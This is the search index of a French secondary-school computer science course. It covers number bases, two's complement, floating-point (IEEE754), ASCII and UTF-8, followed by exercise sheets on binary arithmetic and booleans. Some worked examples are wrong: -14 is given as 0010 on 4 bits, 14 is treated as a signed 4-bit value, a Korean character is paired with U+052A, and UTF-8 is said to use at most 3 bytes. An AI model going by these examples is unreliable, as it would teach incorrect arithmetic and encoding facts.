regroupe par paquets de 4 bits en partant du bit de poids faible et en rajoutant des 0 si jamais le paquet le plus \u00e0 droite contient moins de 4 bits.                 Enfin, on associe chaque paquet de 4 bits \u00e0 son \u00e9quivalent en base 16.              \ud83d\udcbb Exemple : Convertir 430\u2081\u2080 en hexad\u00e9cimal <pre><code>1. On a 430\u2081\u2080. On cherche sa repr\u00e9sentation en base 2.\n   430\u2081\u2080 = 110101110\u2082\n\n2. On rajoute les 0 \u00e0 gauche pour cr\u00e9er des paquets de 4 :\n   000110101110\u2082\n\n3. On associe les bits correspondants :\n   0001\u2082 = 1\u2081\u2086\n   1010\u2082 = A\u2081\u2086 \n   1110\u2082 = E\u2081\u2086\n\n4. R\u00e9sultat : 430\u2081\u2080 = 1AE\u2081\u2086</code></pre> \ud83d\udd04 Passage de la base hexad\u00e9cimale \u00e0 la base d\u00e9cimale \u26a1 Puissances de 16                  On peut en connaissant les puissances de 16, r\u00e9aliser les additions de puissances de 16 correspondant \u00e0 chaque symbole du nombre \u00e9crit en hexad\u00e9cimal.                 Pour rendre cela compr\u00e9hensible, on peut remplacer chaque symbole hexad\u00e9cimal par sa repr\u00e9sentation en base 10.              \ud83d\udcbb Exemple : Convertir 1AE\u2081\u2086 en d\u00e9cimal <pre><code>1\u2081\u2086 = 1\u2081\u2080 ; A\u2081\u2086 = 10\u2081\u2080 ; E\u2081\u2086 = 14\u2081\u2080\n\n1AE\u2081\u2086 = 1\u00d716\u00b2 + 10\u00d716\u00b9 + 14\u00d716\u2070\n      = 256\u2081\u2080 + 160\u2081\u2080 + 14\u2081\u2080 \n      = 430\u2081\u2080</code></pre> \ud83d\udd04 Passage par la base 2                  La premi\u00e8re \u00e9tape est de convertir chaque symbole du nombre en base hexad\u00e9cimale en base 2.                 Ensuite, simplement, on convertit de la base 2 \u00e0 la base d\u00e9cimale comme vu pr\u00e9c\u00e9demment.              \ud83d\udcbb Exemple : Convertir 1AE\u2081\u2086 en d\u00e9cimal <pre><code>1. Conversion hex \u2192 binaire :\n   1AE\u2081\u2086 = 0001 1010 1110\u2082\n\n2. Conversion binaire \u2192 d\u00e9cimal :\n   000110101110\u2082 = 1\u00d72\u2078 + 1\u00d72\u2077 + 1\u00d72\u2075 + 1\u00d72\u00b3 + 1\u00d72\u00b2 + 1\u00d72\u00b9\n                  = 256 + 128 + 32 + 8 + 4 + 2\n                  = 430\u2081\u2080</code></pre> \ud83d\udcca Table de correspondance Hexad\u00e9cimal \u2194 Binaire Hexad\u00e9cimal Binaire Hexad\u00e9cimal Binaire 0000081000 1000191001 20010A1010 30011B1011 40100C1100 50101D1101 60110E1110 70111F1111 \u270f\ufe0f Exercices Exercice 1 : Conversion de l'hexad\u00e9cimal au d\u00e9cimal :             Convertir le nombre hexad\u00e9cimal 1F3\u2081\u2086 en d\u00e9cimal.              Exercice 2 : Conversion du d\u00e9cimal \u00e0 l'hexad\u00e9cimal :             Convertir le nombre d\u00e9cimal 393\u2081\u2080 en hexad\u00e9cimal."},{"location":"premiere/II-Representation_des_donnees/Cours/c_2_entier_relatif/","title":"C 2 entier relatif","text":"\u2796 Entiers n\u00e9gatifs en Binaire \ud83d\udd22 Les entiers n\u00e9gatifs \ud83d\udcd6 Contexte              Le cours pr\u00e9c\u00e9dent a permis d'expliquer comment repr\u00e9senter les nombres entiers positifs en base 2 pour en permettre le traitement par un ordinateur.                          Cependant, toutes les grandeurs ne sont pas exclusivement positives :             <ul> <li>Tension alternative</li> <li>Acc\u00e9l\u00e9ration d'un freinage</li> <li>Temp\u00e9rature en dessous de z\u00e9ro</li> <li>Coordonn\u00e9es g\u00e9ographiques</li> </ul>              Pour pouvoir r\u00e9aliser des simulations ou des traitements, il va falloir pouvoir repr\u00e9senter les nombres n\u00e9gatifs.          \ud83c\udfaf Premi\u00e8re tentative : le bit de signe \ud83d\udca1 Principe              Une premi\u00e8re technique de repr\u00e9sentation des nombres n\u00e9gatifs est d'ajouter un bit de poids fort (tout \u00e0 gauche) qui repr\u00e9sente le signe :             <ul> <li>0 repr\u00e9sente un nombre positif</li> <li>1 repr\u00e9sente un nombre n\u00e9gatif</li> </ul> \ud83d\udcbb Exemples <pre><code>1001\u2082 repr\u00e9sente sur 4 bits sign\u00e9s le chiffre -1\n0100\u2082 repr\u00e9sente sur 4 bits sign\u00e9s le chiffre +4</code></pre> \u26a0\ufe0f Probl\u00e8mes identifi\u00e9s              Cela pourrait sembler \u00eatre une bonne tentative, cependant deux probl\u00e8mes majeurs se posent :          \u274c Probl\u00e8me 1 : Double repr\u00e9sentation du z\u00e9ro                  En effet, 0 n'est ni positif ni n\u00e9gatif. On peut donc en d\u00e9duire 2 repr\u00e9sentations sur 4 bits par exemple :                 <ul> <li>1000\u2082 (z\u00e9ro \"n\u00e9gatif\")</li> <li>0000\u2082 (z\u00e9ro \"positif\")</li> </ul>                  Avoir 2 repr\u00e9sentations pour un m\u00eame chiffre n'est pas concevable notamment pour les repr\u00e9sentations en m\u00e9moire ou bien pour les op\u00e9rations.              \u274c Probl\u00e8me 2 : Op\u00e9rations incorrectes                  Les op\u00e9rations arithm\u00e9tiques ne donnent pas les bons r\u00e9sultats.              \ud83d\udcbb Test : -13 + 13 sur 5 bits <pre><code>11101\u2082 + 01101\u2082 = 101010\u2082\n\nSur 5 bits : 11101\u2082 + 01101\u2082 = 01010\u2082\n\nR\u00e9sultat attendu : -13 + 13 = 0\nR\u00e9sultat obtenu : 01010\u2082 = +10\u2081\u2080 \u274c</code></pre>          \ud83d\udeab Conclusion : Cette repr\u00e9sentation n'est pas utilisable pour les calculs informatiques.      \u2705 Seconde tentative : le compl\u00e9ment \u00e0 2 \ud83c\udfaf La solution : le compl\u00e9ment \u00e0 2              Le compl\u00e9ment \u00e0 2 est une technique qui a \u00e9t\u00e9 propos\u00e9e pour repr\u00e9senter les nombres n\u00e9gatifs de mani\u00e8re efficace et sans ambigu\u00eft\u00e9.          \ud83d\ude97 Analogie : le compteur kilom\u00e9trique              On peut illustrer cela comme un compteur kilom\u00e9trique de vieille voiture :             <ul> <li>Sur les compteurs des vieilles voitures, faire une marche arri\u00e8re permettait de r\u00e9duire le nombre de kilom\u00e8tres affich\u00e9s</li> <li>Si on recule au kilom\u00e8tre 000000, le compteur \u00e9tant circulaire, en reculant d'un kilom\u00e8tre de plus, ce compteur va afficher : 999999</li> <li>Cette valeur 999999 peut donc repr\u00e9senter le kilom\u00e8tre -1</li> </ul>              Cela a donn\u00e9 l'id\u00e9e pour repr\u00e9senter les nombres n\u00e9gatifs en binaire !          \ud83d\udcbb Principe de repr\u00e9sentation <pre><code>1\u2081\u2080 = 0001\u2082 \u2192 0\u2081\u2080 = 0000\u2082 \u2192 -1\u2081\u2080 = 1111\u2082 \u2192 -2\u2081\u2080 = 1110\u2082 \u2192 ...</code></pre> \ud83d\udd27 M\u00e9thode de conversion \u00c9tapes pour convertir un nombre n\u00e9gatif : <ol> <li>Convertir le nombre choisi en base 2</li> <li>Inverser chaque bit : 0 devient 1 et inversement</li> <li>Ajouter 1 \u00e0 la repr\u00e9sentation binaire du nombre invers\u00e9</li> </ol> \ud83d\udcbb Exemple : Repr\u00e9senter -14 en base 2 <pre><code>\u00c9tape 1 : 14\u2081\u2080 = 1110\u2082\n\u00c9tape 2 : 1110\u2082 \u2192 0001\u2082 (inversion)\n\u00c9tape 3 : 0001\u2082 + 1\u2082 = 0010\u2082 = -14\u2081\u2080</code></pre> \u2705 V\u00e9rification des op\u00e9rations                  Testons si cette m\u00e9thode r\u00e9sout le probl\u00e8me des op\u00e9rations.              \ud83d\udcbb Test : 14 + (-4) sur 4 bits <pre><code>-4\u2081\u2080 = 1100\u2082 (compl\u00e9ment \u00e0 2)\n14\u2081\u2080 = 1110\u2082\n\nCalcul : 1110\u2082 + 1100\u2082 = 11010\u2082\n\nSur 4 bits : on garde les 4 derniers bits : 1010\u2082\nR\u00e9sultat : 1010\u2082 = 10\u2081\u2080 \u2705\n\nV\u00e9rification : 14 + (-4) = 10 \u2705</code></pre>          \u2705 Succ\u00e8s ! Le compl\u00e9ment \u00e0 2 permet de r\u00e9aliser toutes les op\u00e9rations possibles sans erreur. C'est la m\u00e9thode utilis\u00e9e dans tous les ordinateurs modernes.      \ud83d\udcca Comparaison des m\u00e9thodes Crit\u00e8re Bit de signe Compl\u00e9ment \u00e0 2 Repr\u00e9sentation unique du z\u00e9ro \u274c Non (deux repr\u00e9sentations) \u2705 Oui (une seule) Op\u00e9rations arithm\u00e9tiques correctes \u274c Non \u2705 Oui Simplicit\u00e9 d'impl\u00e9mentation \u26a0\ufe0f Complexe \u2705 Simple Utilisation actuelle \u274c Abandonn\u00e9e \u2705 Standard universel"},{"location":"premiere/II-Representation_des_donnees/Cours/c_2_nombres_reels/","title":"C 2 nombres reels","text":"\ud83d\udd22 Nombres r\u00e9els en Binaire \ud83d\udcab Les nombres r\u00e9els en binaire \ud83d\udcd6 Contexte              Apr\u00e8s avoir repr\u00e9sent\u00e9 les nombres entiers, il est n\u00e9cessaire de repr\u00e9senter les nombres r\u00e9els, nombres dits d\u00e9cimaux ou \u00e0 virgule.                          Les nombres d\u00e9cimaux permettent de repr\u00e9senter des valeurs qui peuvent \u00eatre analogiques :             <ul> <li>\u03c0 (pi) \u2248 3.14159...</li> <li>Temp\u00e9rature : 36.7\u00b0C</li> <li>Altitude : 1847.5 m\u00e8tres</li> <li>Coordonn\u00e9es GPS : 48.8566\u00b0 N</li> </ul>              La repr\u00e9sentation des nombres r\u00e9els a \u00e9t\u00e9 approch\u00e9e de plusieurs mani\u00e8res diff\u00e9rentes.          \u270f\ufe0f \u00c9criture en binaire de la partie r\u00e9elle \ud83d\udd0d Principe              Pour \u00e9crire la partie r\u00e9elle d'un nombre en binaire, on utilise les puissances n\u00e9gatives de 2.              Rappel des puissances n\u00e9gatives : <ul> <li>2\u207b\u00b9 = 1/2 = 0,5</li> <li>2\u207b\u00b2 = 1/4 = 0,25</li> <li>2\u207b\u00b3 = 1/8 = 0,125</li> <li>2\u207b\u2074 = 1/16 = 0,0625</li> </ul> \ud83d\udcdd Exemple : 0,75 en binaire <pre>0,75 = 0,5 + 0,25\n      = 2\u207b\u00b9 + 2\u207b\u00b2\n      = 0,11\u2082</pre> \ud83d\udd04 M\u00e9thode des multiplications successives \ud83d\udccb Algorithme                  Pour convertir la partie d\u00e9cimale d'un nombre en binaire :                 <ol> <li>Multiplier la partie d\u00e9cimale par 2</li> <li>Si le r\u00e9sultat \u2265 1 : \u00e9crire 1 et soustraire 1</li> <li>Sinon : \u00e9crire 0</li> <li>R\u00e9p\u00e9ter avec la nouvelle partie d\u00e9cimale</li> </ol> \ud83c\udfaf Exemple pratique : 14,75 Partie enti\u00e8re : 14\u2081\u2080 = 1110\u2082                  Partie d\u00e9cimale : 0,75              Partie d\u00e9cimale Bit Multiplication \u00d7 2 0,75 - 0,75 1,5 1 0,5 1,0 1 0,0 R\u00e9sultat final <pre>14,75\u2081\u2080 = 1110\u2082 + 0,11\u2082 = 1110,11\u2082</pre>          \u26a0\ufe0f Attention : Certains nombres d\u00e9cimaux ne peuvent pas \u00eatre repr\u00e9sent\u00e9s exactement en binaire (ex: 0,1 donne une suite infinie en binaire).      \ud83e\uddee Test d'op\u00e9ration \ud83d\udd0d V\u00e9rification pratique              On a vu dans le cours pr\u00e9c\u00e9dent que pour qu'une repr\u00e9sentation soit utilisable, elle doit permettre les op\u00e9rations sans erreurs.                          Faisons un test sur l'op\u00e9ration 14,75 + 1,25.          \ud83d\udcdd Conversion de 1,25\u2081\u2080 en binaire Partie enti\u00e8re : 1\u2081\u2080 = 1\u2082              Partie d\u00e9cimale : 0,25          Partie d\u00e9cimale Bit Multiplication \u00d7 2 0,25 - 0,25 0,5 0 0,5 1,0 1 0,0 0,0 0 0 R\u00e9sultat <pre>0,25\u2081\u2080 = 0,010\u2082\nDonc : 1,25\u2081\u2080 = 1,010\u2082</pre> \ud83e\uddee V\u00e9rification de l'op\u00e9ration <pre>14,75\u2081\u2080 + 1,25\u2081\u2080 = 16\u2081\u2080\n1110,110\u2082 + 1,010\u2082 = 10000,000\u2082 = 16\u2081\u2080 \u2705</pre>          \ud83d\udca1 Observation : Cette repr\u00e9sentation fonctionne, mais les machines (ordinateurs et smartphones) n'utilisent pas cette m\u00e9thode. Elles utilisent la m\u00e9thode de la virgule flottante.      \ud83c\udfdb\ufe0f La Norme IEEE754 \ud83d\udcd6 Principe g\u00e9n\u00e9ral              La norme IEEE754 permet de repr\u00e9senter les nombres r\u00e9els en utilisant le principe de virgule flottante.                          Cette norme permet d'\u00e9crire chaque nombre comme une \u00e9criture scientifique avec pour base 2.                          Un nombre N s'\u00e9crit : N = (-1)\u02e2 \u00d7 m \u00d7 2\u207f avec m \u2208 [1;2[          \ud83c\udfd7\ufe0f Structure IEEE754 (32 bits - simple pr\u00e9cision) S E E E E E E E E M M M M M M M M M M M M M M M M M M M M M M M S = Signe (1 bit) : 0 = positif, 1 = n\u00e9gatif E = Exposant (8 bits) : puissance de 2 (biais\u00e9e de 127) M = Mantisse (23 bits) : partie fractionnaire \ud83c\udfaf Exemple : 14,75 en IEEE754 \u00c9tape 1 : Repr\u00e9senter en base 2 14\u2081\u2080 = 1110,110\u2082                  \u00c9tape 2 : \u00c9criture scientifique 1110,110\u2082 = 1,110110\u2082 \u00d7 2\u00b3                  R\u00e9sultat : s=0, m=110110\u2082, n=3              \ud83d\udd27 Calcul des composants \u00c9tape 3 : Exposant biais\u00e9 E = n + 127 = 3 + 127 = 130                 130\u2081\u2080 = 10000010\u2082                  \u00c9tape 4 : Assemblage final 14,75\u2081\u2080 = 0 10000010 11011000000000000000000              \u26a0\ufe0f Probl\u00e8me d'impr\u00e9cision des flottants \ud83d\udea8 Limitation importante              La repr\u00e9sentation des nombres r\u00e9els en binaire peut poser des probl\u00e8mes d'impr\u00e9cision.                          Certains nombres d\u00e9cimaux ne peuvent pas \u00eatre repr\u00e9sent\u00e9s exactement en binaire.                          Par exemple, le nombre 0,1 en d\u00e9cimal ne peut pas \u00eatre repr\u00e9sent\u00e9 exactement en binaire.          \ud83d\udc0d Exemple en Python D\u00e9monstration du probl\u00e8me <pre>&gt;&gt;&gt; 0.1 + 0.2\n0.30000000000000004\n\n&gt;&gt;&gt; a = 3.3\n&gt;&gt;&gt; b = 2.1\n&gt;&gt;&gt; c = 4.2\n&gt;&gt;&gt; (a+b)*c\n22.680000000000003\n&gt;&gt;&gt; a*c + b*c\n22.68</pre>                  Ce probl\u00e8me est d\u00fb au fait que 0,1 et 0,2 ne peuvent pas \u00eatre repr\u00e9sent\u00e9s exactement en binaire.              \ud83d\udd27 Solutions pratiques Solution 1 : Biblioth\u00e8que decimal Utilisation de decimal <pre>from decimal import Decimal\n\na = Decimal('0.1')\nb = Decimal('0.2')\nprint(a + b)  # 0.3\nprint(a + b == Decimal('0.3'))  # True</pre> Solution 2 : Tol\u00e9rance pour comparaisons Fonction de comparaison avec tol\u00e9rance <pre>def almost_equal(a, b, tolerance=1e-9):\n    return abs(a - b) &lt; tolerance\n\nprint(almost_equal(0.1 + 0.2, 0.3))  # True</pre>          \ud83d\udca1 Conseil : Toujours \u00eatre prudent avec les comparaisons de nombres flottants et utiliser des m\u00e9thodes appropri\u00e9es selon le contexte d'application."},{"location":"premiere/II-Representation_des_donnees/Cours/c_3_caracteres/","title":"C 3 caracteres","text":"\ud83d\udcdd La repr\u00e9sentation des caract\u00e8res <p>Codage et encodage des symboles textuels</p> \ud83c\udfaf Objectif du cours \ud83d\udcda Ce que vous allez apprendre              Cette le\u00e7on permettra de savoir comment repr\u00e9senter en binaire des caract\u00e8res textuels.                          Nous d\u00e9couvrirons les diff\u00e9rents syst\u00e8mes de codage et leurs \u00e9volutions.          \ud83d\udcd6 D\u00e9finition \ud83d\udd24 Qu'est-ce qu'un caract\u00e8re ?              Un caract\u00e8re est un symbole d'\u00e9criture repr\u00e9sentant en g\u00e9n\u00e9ral :             <ul> <li>Une lettre (A, b, C)</li> <li>Un chiffre (1, 2, 3, ...)</li> <li>Un symbole (\u5b57, \u0414, @, #)</li> </ul> A Lettre latine 5 Chiffre \u5b57 Caract\u00e8re chinois \u0414 Lettre cyrillique          \ud83e\udd16 Probl\u00e8me informatique : En informatique, on ne peut pas repr\u00e9senter directement un caract\u00e8re car elle ne comprend que des 0 et des 1. Il faut donc les coder pour la machine.      \ud83d\udd27 Syst\u00e8me de codage Le codage d'un caract\u00e8re est une association entre celui-ci et une repr\u00e9sentation binaire.                          Un syst\u00e8me de codage est un ensemble de r\u00e8gles pour convertir une information par une autre (ici un caract\u00e8re avec sa repr\u00e9sentation binaire).          \ud83c\uddfa\ud83c\uddf8 Un syst\u00e8me de codage de caract\u00e8re : ASCII \ud83d\udccb ASCII (American Standard Code for Information Interchange)              L'ASCII est un codage qui utilise 7 bits pour repr\u00e9senter des caract\u00e8res alpha-num\u00e9riques et d'autres caract\u00e8res r\u00e9serv\u00e9s (comme l'espace ou le retour chariot).                          En ayant 7 bits pour repr\u00e9senter un caract\u00e8re, on peut repr\u00e9senter 2\u2077 = 128 caract\u00e8res.          \ud83d\udcca Capacit\u00e9 d'ASCII 7 bits = 128 caract\u00e8res possibles                  Cela inclut :                 <ul> <li>26 lettres minuscules (a-z)</li> <li>26 lettres majuscules (A-Z)</li> <li>10 chiffres (0-9)</li> <li>Symboles de ponctuation</li> <li>Caract\u00e8res de contr\u00f4le</li> </ul> \ud83d\udd22 Exemples de codes ASCII A 65 (d\u00e9cimal) a 97 (d\u00e9cimal) 0 48 (d\u00e9cimal) @ 64 (d\u00e9cimal)          Pour faciliter la compr\u00e9hension, on peut dresser une table de correspondance.      \ud83d\udccb Table de correspondance ASCII (extrait) D\u00e9c Hex Car D\u00e9c Hex Car D\u00e9c Hex Car D\u00e9c Hex Car 32 20 (espace) 48 30 0 64 40 @ 80 50 P 33 21 ! 49 31 1 65 41 A 81 51 Q 34 22 \" 50 32 2 66 42 B 82 52 R 97 61 a 113 71 q 122 7A z 126 7E ~          \u26a0\ufe0f Limitation d'ASCII : \u00c0 la vue de cette table, on remarque une chose importante : il n'y a que des symboles d'alphabets latins.                  Or, il n'existe pas uniquement les alphabets latins mais aussi le cyrillique ou bien les symboles des alphabets chinois ou japonais.                  \ud83d\udca1 Solution : On a besoin d'un codage permettant de repr\u00e9senter davantage de caract\u00e8res.      \ud83c\udf0d Un syst\u00e8me plus inclusif : Unicode \ud83d\udd24 Unicode - Le standard universel Unicode est un syst\u00e8me de codage de caract\u00e8re qui utilise un certain nombre de bits en fonction de sa version, plus connu sous le nom de UTF.                          On utilise plus souvent le syst\u00e8me UTF-8 qui utilise 8 bits pour repr\u00e9senter des caract\u00e8res. Il peut cependant utiliser 1, 2 voire m\u00eame 3 groupes de 8 bits (octets) pour repr\u00e9senter davantage de caract\u00e8res.          \ud83c\udfaf Principe des points de code                  Chaque symbole poss\u00e8de un point de code, qui est l'ensemble des bits permettant sa repr\u00e9sentation, souvent repr\u00e9sent\u00e9 en hexad\u00e9cimal.              \ud83d\udc0d Utilisation en Python Python utilise l'encodage UTF-8 pour coder ses symboles et les repr\u00e9senter.                                  Il est possible d'observer un encodage sp\u00e9cial sur une cha\u00eene de caract\u00e8re en utilisant la m\u00e9thode <code>encode</code> des cha\u00eenes de caract\u00e8res.              \ud4aa U+052A Caract\u00e8re cor\u00e9en A U+0041 Lettre latine majuscule \u16d2 U+16D2 Lettre B runique \u5b57 U+5B57 Caract\u00e8re chinois \ud83d\udd17 Ressource utile              On retrouvera la table UTF-8 compl\u00e8te \u00e0 cette adresse :              Table UTF-8"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/","title":"Fiche d'Exercices : Nombres en Base 2","text":""},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#1-conversion-binaire-decimal-hexadecimal","title":"1. Conversion Binaire, D\u00e9cimal, Hexad\u00e9cimal","text":"<p>Exercice 1 : Conversion Binaire vers D\u00e9cimal Convertissez les nombres binaires suivants en d\u00e9cimal :</p> <ul> <li>\\(1101_{2}\\)</li> <li>\\(10101_{2}\\)</li> <li>\\(111000_{2}\\)</li> <li>\\(10010_{2}\\)</li> <li>\\(110110_{2}\\)</li> </ul> <p>Exercice 2 : Conversion D\u00e9cimal vers Binaire Convertissez les nombres d\u00e9cimaux suivants en binaire :</p> <ul> <li>\\(13_{10}\\)</li> <li>\\(42_{10}\\)</li> <li>\\(255_{10}\\)</li> <li>\\(76_{10}\\)</li> <li>\\(128_{10}\\)</li> </ul> <p>Exercice 3 : Conversion D\u00e9cimal vers Hexad\u00e9cimal Convertissez les nombres d\u00e9cimaux suivants en hexad\u00e9cimal :</p> <ul> <li>\\(30_{10}\\)</li> <li>\\(75_{10}\\)</li> <li>\\(128_{10}\\)</li> <li>\\(42_{10}\\)</li> <li>\\(99_{10}\\)</li> </ul> <p>Exercice 4 : Conversion Hexad\u00e9cimal vers D\u00e9cimal Convertissez les nombres hexad\u00e9cimaux suivants en d\u00e9cimal :</p> <ul> <li>\\(1A_{16}\\)</li> <li>\\(3F_{16}\\)</li> <li>\\(7D_{16}\\)</li> <li>\\(2A_{16}\\)</li> <li>\\(5E_{16}\\)</li> </ul> <p></p> <p>Exercice 5 : Conversion D\u00e9cimal vers Hexad\u00e9cimal (M\u00e9thode des Divisions Successives) Convertissez les nombres d\u00e9cimaux suivants en hexad\u00e9cimal en utilisant la m\u00e9thode des divisions successives :</p> <ul> <li>\\(62_{10}\\)</li> <li>\\(158_{10}\\)</li> <li>\\(255_{10}\\)</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#2-operations-en-base-2","title":"2. Op\u00e9rations en Base 2","text":""},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#addition-en-base-2","title":"Addition en Base 2 :","text":"<p>Effectuez les additions binaires suivantes :</p> <ul> <li>\\(1101_{2} + 101_{2}\\)</li> <li>\\(10000_{2} + 1101_{2}\\)</li> <li>\\(1111_{2} + 10_{2}\\)</li> <li>\\(10101_{2} + 1101_{2}\\)</li> <li>\\(11110_{2} + 110_{2}\\)</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#soustraction-en-base-2","title":"Soustraction en Base 2 :","text":"<p>Effectuez les soustractions binaires suivantes :</p> <ul> <li>\\(1101_{2} - 101_{2}\\)</li> <li>\\(10000_{2} - 1101_{2}\\)</li> <li>\\(1111_{2} - 10_{2}\\)</li> <li>\\(10101_{2} - 1101_{2}\\)</li> <li>\\(11110_{2} - 110_{2}\\)</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#multiplication-en-base-2","title":"Multiplication en Base 2 :","text":"<p>Effectuez les multiplications binaires suivantes :</p> <ul> <li>\\(1101_{2} \\times 101_{2}\\)</li> <li>\\(10000_{2} \\times 1101_{2}\\)</li> <li>\\(1111_{2} \\times 10_{2}\\)</li> <li>\\(10101_{2} \\times 1101_{2}\\)</li> <li>\\(11110_{2} \\times 110_{2}\\)</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#3-complement-a-deux","title":"3. Compl\u00e9ment \u00e0 Deux","text":""},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#complement-a-deux-8-bits","title":"Compl\u00e9ment \u00e0 Deux (8 bits) :","text":"<p>Trouvez le compl\u00e9ment \u00e0 deux des nombres binaires suivants (sur 8 bits) :</p> <ul> <li>\\(0110\\ 0101_{2}\\)</li> <li>\\(0001\\ 1110_{2}\\)</li> <li>\\(0100\\ 1101_{2}\\)</li> <li>\\(0011\\ 1010_{2}\\)</li> <li>\\(0111\\ 1111_{2}\\)</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#complement-a-deux-16-bits","title":"Compl\u00e9ment \u00e0 Deux (16 bits) :","text":"<p>Trouvez le compl\u00e9ment \u00e0 deux des nombres binaires suivants (sur 16 bits) :</p> <ul> <li>\\(0110\\ 0101\\ 1010\\ 1100_{2}\\)</li> <li>\\(0001\\ 1110\\ 0101\\ 0111_{2}\\)</li> <li>\\(0100\\ 1101\\ 1011\\ 1010_{2}\\)</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#4-conversion-entre-decimal-et-complement-a-deux","title":"4. Conversion entre D\u00e9cimal et Compl\u00e9ment \u00e0 Deux","text":""},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#decimal-vers-complement-a-deux","title":"D\u00e9cimal vers Compl\u00e9ment \u00e0 Deux :","text":"<p>Convertissez les nombres d\u00e9cimaux suivants en leur repr\u00e9sentation binaire sur 8 bits en utilisant le compl\u00e9ment \u00e0 deux :</p> <ul> <li>\\(-5_{10}\\)</li> <li>\\(-18_{10}\\)</li> <li>\\(-25_{10}\\)</li> <li>\\(-50_{10}\\)</li> <li>\\(-100_{10}\\)</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#complement-a-deux-vers-decimal","title":"Compl\u00e9ment \u00e0 Deux vers D\u00e9cimal :","text":"<p>Convertissez les nombres binaires n\u00e9gatifs suivants (en compl\u00e9ment \u00e0 deux sur 8 bits) en d\u00e9cimal :</p> <ul> <li>\\(1111\\ 1011_{2}\\)</li> <li>\\(1110\\ 1110_{2}\\)</li> <li>\\(1110\\ 0111_{2}\\)</li> <li>\\(1100\\ 1110_{2}\\)</li> <li>\\(1001\\ 1100_{2}\\)</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_Nombres_binaires/#5-binaire-et-python","title":"5. Binaire et Python","text":"<p>Exercice 1 : En reprenant l'algorithme des divisions successives, r\u00e9alisez une fonction <code>base10_vers_binaire</code>. Cette fonction prendra en param\u00e8tre un nombre entier et renverra une cha\u00eene de caract\u00e8res correspondant \u00e0 la repr\u00e9sentation en base 2 de celui-ci.</p> <p>Exercice 2 : \u00c9crivez une fonction <code>binaire_vers_base10</code>. Cette fonction prendra en param\u00e8tre une repr\u00e9sentation en base 2 d'un nombre (cha\u00eene de caract\u00e8res) et renverra un nombre entier.</p>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_bool/","title":"\ud83d\udd04 Fiche d'exercices : Bool\u00e9ens et Comparaisons en Programmation","text":""},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_bool/#partie-1-introduction-aux-booleens","title":"\ud83d\udcda Partie 1 : Introduction aux Bool\u00e9ens","text":"<p>Un bool\u00e9en est un type de donn\u00e9e ayant deux valeurs possibles : <code>True</code> (vrai) ou <code>False</code> (faux).</p>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_bool/#exercice-1-comprendre-les-booleens","title":"\ud83c\udfaf Exercice 1 : Comprendre les bool\u00e9ens \u2b50","text":"<p>Quel sera le r\u00e9sultat de ces expressions ? <code>True</code> ou <code>False</code>.</p> <ol> <li><code>10 &gt; 5</code> \u2794 <code>______</code></li> <li><code>7 == 9</code> \u2794 <code>______</code></li> <li><code>3 &lt;= 3</code> \u2794 <code>______</code></li> <li><code>False != True</code> \u2794 <code>______</code></li> <li><code>not False</code> \u2794 <code>______</code></li> <li><code>5 != 5</code> \u2794 <code>______</code></li> </ol>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_bool/#partie-2-operateurs-de-comparaison","title":"\ud83d\udcda Partie 2 : Op\u00e9rateurs de comparaison","text":"<p>Les op\u00e9rateurs de comparaison sont utilis\u00e9s pour comparer deux valeurs. Le r\u00e9sultat d'une comparaison est toujours un bool\u00e9en (<code>True</code> ou <code>False</code>).</p>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_bool/#liste-des-operateurs","title":"\ud83d\udcdd Liste des op\u00e9rateurs:","text":"<ul> <li><code>==</code> : \u00e9gal \u00e0</li> <li><code>!=</code> : diff\u00e9rent de</li> <li><code>&gt;</code> : sup\u00e9rieur \u00e0</li> <li><code>&lt;</code> : inf\u00e9rieur \u00e0</li> <li><code>&gt;=</code> : sup\u00e9rieur ou \u00e9gal \u00e0</li> <li><code>&lt;=</code> : inf\u00e9rieur ou \u00e9gal \u00e0</li> </ul>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_bool/#exercice-2-comparaisons-simples","title":"\ud83c\udfaf Exercice 2 : Comparaisons simples \u2b50\u2b50","text":"<p>Donner le r\u00e9sultat des expressions suivantes :</p> <ol> <li><code>8 == 8</code> \u2794 <code>______</code></li> <li><code>4 != 2</code> \u2794 <code>______</code></li> <li><code>7 &gt; 10</code> \u2794 <code>______</code></li> <li><code>6 &gt;= 6</code> \u2794 <code>______</code></li> <li><code>3 &lt; 8</code> \u2794 <code>______</code></li> </ol>"},{"location":"premiere/II-Representation_des_donnees/Fiches_d_exercices/Fiche_exercice_bool/#partie-3-operateurs-logiques","title":"\ud83d\udcda Partie 3 : Op\u00e9rateurs logiques","text":"<p>Les op\u00e9rateurs logiques permettent de combiner plusieurs expressions bool\u00e9ennes :</p> <ul> <li><code>and</code> : renvoie <code>True</code> si les deux conditions sont vraies.</li> <li><code>or</code> : renvoie <code>True</code> si au moins une condition est vraie.</li> <li><code>not</code> : inverse la valeur d'une 